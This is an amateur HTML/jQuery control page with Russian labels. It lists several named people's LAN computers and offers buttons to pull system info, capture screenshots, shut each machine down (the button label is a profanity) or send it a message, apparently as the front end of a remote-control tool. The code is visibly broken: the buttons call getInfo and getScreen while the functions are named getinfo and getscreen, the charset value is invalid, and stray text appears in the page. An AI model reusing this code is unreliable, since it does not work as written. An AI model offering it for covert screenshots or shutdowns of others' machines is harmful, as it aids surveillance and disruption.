<!DOCTYPE html>
<html>
    <head>
    <meta charset="unicode" />
        <title>Information page</title>
        <style>
            .online{
                background-color:green;
            }

            .offline{
                background-color:gray;
            }
        </style>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script>
            String.prototype.replaceAll = function(search, replace){
                return this.split(search).join(replace);
            }
            function getinfo(ip){
                $.ajax({
                    url: "direct?ip="+ip+"&t=1"
                }).done(function(data) {
                    /*var asd = data.split('|');
                    asd.forEach(function callback(cur,ind,arr){
                        alert(cur);
                        saopfjhiodsaufusgSOOOOOOOOKAAAAAAAAAAAAA
                    });*/
                    $("#info").text(data);
                });
            }

            function getscreen(ip){
                $.ajax({
                    url: "direct?ip="+ip+"&t=2"
                }).done(function(data) {
                    document.getElementById("image").setAttribute( 'src',  "data:image/png;base64," + data);
                });
            }

            function shutdown(ip){
                $.ajax({
                    url: "direct?ip="+ip+"&t=3"
                });
            }

            function showMessage(ip){
                $.ajax({
                    url: "informationport?ip="+ip+"&t=4&message="+$("#messageinput").val()
                });
            }
        </script>
    </head>
    <body>
    <input id="messageinput" type="text" placeholder="Сообщение"/>
        <div>
            <p>Local</p>
            <label class="offline" style="width:20px;height:20px;display:block;"></label>
            <button onClick="getInfo('127.0.0.1')">Информация</button>
            <button onClick="getScreen('127.0.0.1')">Скриншот</button>
            <button onClick="shutdown('127.0.0.1')">Выключить нахуй</button>
            <button onClick="showMessage('127.0.0.1')">Сообщение</button>
        </div>
        <div>
            <p>vitya</p>
            <label class="offline" style="width:20px;height:20px;display:block;"></label>
            <button onClick="getInfo('192.168.1.39')">Информация</button>
            <button onClick="getScreen('192.168.1.39')">Скриншот</button>
            <button onClick="shutdown('192.168.1.39')">Выключить нахуй</button>
            <button onClick="showMessage('192.168.1.39')">Сообщение</button>
        </div>sdsd
        <div>
            <p>kostya</p>
            <label class="offline" style="width:20px;height:20px;display:block;"></label>
            <button onClick="getInfo('192.168.1.53')">Информация</button>
            <button onClick="getScreen('192.168.1.53')">Скриншот</button>
            <button onClick="shutdown('192.168.1.53')">Выключить нахуй</button>
            <button onClick="showMessage('192.168.1.53')">Сообщение</button>
        </div>
        <div>
            <p>vovan</p>
            <label class="offline" style="width:20px;height:20px;display:block;"></label>
            <button onClick="getInfo('192.168.1.58')">Информация</button>
            <button onClick="getScreen('192.168.1.58')">Скриншот</button>
            <button onClick="shutdown('192.168.1.58')">Выключить нахуй</button>
            <button onClick="showMessage('192.168.1.58')">Сообщение</button>
        </div>
        <div>
            <p>vitalya</p>
            <label class="offline" style="width:20px;height:20px;display:block;"></label>
            <button onClick="getInfo('192.168.1.69')">Информация</button>
            <button onClick="getScreen('192.168.1.69')">Скриншот</button>
            <button onClick="shutdown('192.168.1.69')">Выключить нахуй</button>
            <button onClick="showMessage('192.168.1.69')">Сообщение</button>
        </div>
        <p id="info"></p>
        <img id="image" style="max-width: 800px"/>
    </body>
</html>